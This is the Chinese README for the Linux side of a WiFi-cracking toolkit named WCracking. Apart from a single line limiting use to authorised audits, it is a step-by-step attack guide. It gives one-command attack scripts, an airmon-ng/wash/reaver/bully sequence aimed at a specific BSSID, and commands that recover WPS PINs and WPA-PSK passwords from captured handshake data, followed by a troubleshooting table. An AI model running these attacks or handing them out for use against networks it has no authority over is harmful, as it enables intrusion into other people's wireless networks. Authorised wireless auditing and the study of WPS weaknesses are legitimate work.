# WCracking Linux 端

> ⚠️ 仅限对本人拥有或已获书面授权的网络进行安全审计。

Linux（Kali / 树莓派 / 任意 Debian 系）是 **最可靠的主动攻击平台**：USB 无线网卡可进入
监听模式（monitor mode），配合 reaver/bully 抓取 WPS 握手，再由本仓库离线引擎还原 PIN / WPA-PSK。

## 硬件要求

- 一块支持 **监听模式 + 注入** 的 USB 无线网卡，常见芯片：
  - **Atheros AR9271**（如 TP-Link TL-WN722N v1，最推荐，便宜且稳定）
  - Ralink RT3070 / RT5370
  - Realtek RTL8187L / RTL8812AU（部分需额外驱动）
- Kali Linux（虚拟机/U盘/树莓派）或任意 Debian/Ubuntu/树莓派 OS。

## 快速开始

```bash
# 1. 安装依赖
bash linux/install.sh

# 2. 一键攻击（自动监听模式 + 扫描 + Pixie Dust）
bash linux/attack.sh wlan0            # 先扫描附近 WPS 网络
bash linux/attack.sh wlan0 <BSSID>    # 指定目标 BSSID 直接攻击
```

## 手动流程（完整版）

```bash
# 1. 停止干扰进程并进入监听模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0            # 生成 wlan0mon

# 2. 扫描开启 WPS 的 AP
sudo wash -i wlan0mon -C

# 3. Pixie Dust 攻击（reaver 内置，-K 1 自动调用 pixiewps）
sudo reaver -i wlan0mon -b 14:75:90:F0:21:EC -vv -K 1

# 4. 若 reaver 内置 pixiewps 未命中，改用 bully / 离线引擎
sudo bully wlan0mon -b 14:75:90:F0:21:EC -d -v 3
```

## 使用本仓库离线引擎

reaver 抓到手后会用 `[+] AuthKey / PKE / E-Hash1 / E-Hash2 / E-Nonce` 输出握手数据。
把这些数据喂给本仓库离线引擎（纯 Python 或 Rust 加速版）：

```bash
# 纯 Python
python core/pixie_dust.py --pke <PKE> --pkr <PKR> \
  --e-hash1 <H1> --e-hash2 <H2> --authkey <AK> --e-nonce <N1>

# Rust 加速版（ECOS_SIMPLE 等暴力模式快数十倍）
engine/target/release/wcracking-engine \
  -e <PKE> -r <PKR> -s <H1> -z <H2> -a <AK> -n <N1>
```

也可以直接粘贴 reaver 的 verbose 输出到桌面 GUI 的「粘贴自动填充」，一键解析。

## 从 M7 恢复 WPA-PSK（Realtek 设备，被动）

```bash
python core/m7_psk.py --pkr <PKR> --e-nonce <N1> --r-nonce <R1> \
  --e-bssid <BSSID> --m7-enc <ENC7> --m5-enc <ENC5>
```

## 常见问题

| 现象 | 处理 |
|------|------|
| `wash`/`reaver` 找不到网卡 | 确认网卡支持监听模式；`iw list` 查看 supported modes 是否含 monitor |
| `airmon-ng start` 失败 | 先 `sudo airmon-ng check kill`；树莓派可能需 `iw wlan0 set type monitor` |
| reaver 一直重试 | 目标 WPS 可能已锁 PIN，等待解锁或换目标；或目标不支持 Pixie Dust |
| RTL8812AU 无监听模式 | 安装第三方驱动 `aircrack-ng/rtl8812au` |
